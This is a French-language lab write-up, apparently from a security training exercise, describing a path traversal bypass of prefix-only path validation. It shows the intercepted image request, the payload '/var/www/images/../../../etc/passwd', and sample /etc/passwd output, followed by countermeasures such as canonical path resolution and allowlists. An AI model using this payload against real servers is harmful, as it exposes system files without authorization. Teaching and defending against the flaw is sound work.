
# 🧪 Lab 4 - File Path Traversal: Validation du Début du Chemin

---

## 🔍 Description du Lab

Ce lab met en évidence une vulnérabilité **Path Traversal** où l’application :

- Prend en paramètre le **chemin absolu complet** d’un fichier.
- Valide uniquement que le chemin **commence** par un dossier autorisé, sans vérifier ce qui suit.

➡️ Cela ouvre la voie à une **traversée de répertoires** même depuis un chemin considéré "valide".

---

## 🎯 Objectif

Obtenir le contenu du fichier sensible :  
```

/etc/passwd

```

---

## 🛠️ Outils utilisés

- 🧩 **Burp Suite**
- 🧠 Bonne connaissance des chemins UNIX et des contournements classiques
- 🌐 Navigateur avec proxy configuré

---

## 🚦 Étapes d’exploitation

### 1. Intercepter la requête

- Repère une requête qui appelle une image produit, par exemple :
```

GET /image?filename=/var/www/images/product1.jpg

```

### 2. Analyser la protection

- L'application vérifie que le chemin commence par `/var/www/images/`
- Mais **elle ne vérifie pas que la suite du chemin reste dans ce dossier**

### 3. Injecter un chemin contourné

- Modifie la valeur du paramètre `filename` comme ceci :
```

/var/www/images/../../../etc/passwd

```

- Après résolution, ce chemin revient à :
```

/etc/passwd

```

✅ L'application accepte le chemin, pensant qu'il commence dans le bon dossier, mais finit par lire un fichier critique du système.

---

## ✅ Résultat attendu

La réponse doit contenir :
```

root\:x:0:0\:root:/root:/bin/bash
daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin
...

```

---

## 📸 Capture d’écran 

*Ajoute ici une capture d’écran de Burp Suite avec la requête modifiée et la réponse réussie.*

![Path-Traversal](https://github.com/Kabilala/path-traversal/blob/main/lab5/lab5.png)

---

## 🛡️ Contremesures recommandées

- 🔒 **Ne jamais faire confiance** à un simple préfixe de chemin.
- 🛑 **Résoudre le chemin complet (`realpath`)** côté serveur avant validation.
- ✅ Vérifier que le chemin final est **strictement inclus** dans un dossier autorisé.
- Utiliser une **liste blanche** de fichiers ou d’ID de fichiers (au lieu de noms ou chemins en entrée).

---

## 🎓 Concepts clés

| Terme                        | Détail |
|-----------------------------|--------|
| Path Traversal              | Accès illégal à des fichiers via manipulation de chemins |
| `realpath()` / `resolve()`  | Fonction permettant d’obtenir le chemin canonique réel |
| Prefix Validation Bypass    | Technique qui contourne une validation naïve du début de chemin |

---